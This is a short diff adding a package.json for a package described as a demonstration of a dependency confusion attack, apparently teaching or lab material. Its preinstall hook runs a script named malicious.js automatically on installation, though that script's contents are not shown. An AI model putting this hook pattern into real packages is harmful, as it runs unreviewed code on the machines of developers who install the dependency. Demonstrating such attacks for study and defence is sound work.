@@ -1,0 +1,9 @@
+{
+  "name": "vulnerable-package",
+  "version": "1.0.0",
+  "description": "Demonstration of dependency confusion attack",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node malicious.js"
+  }
+}
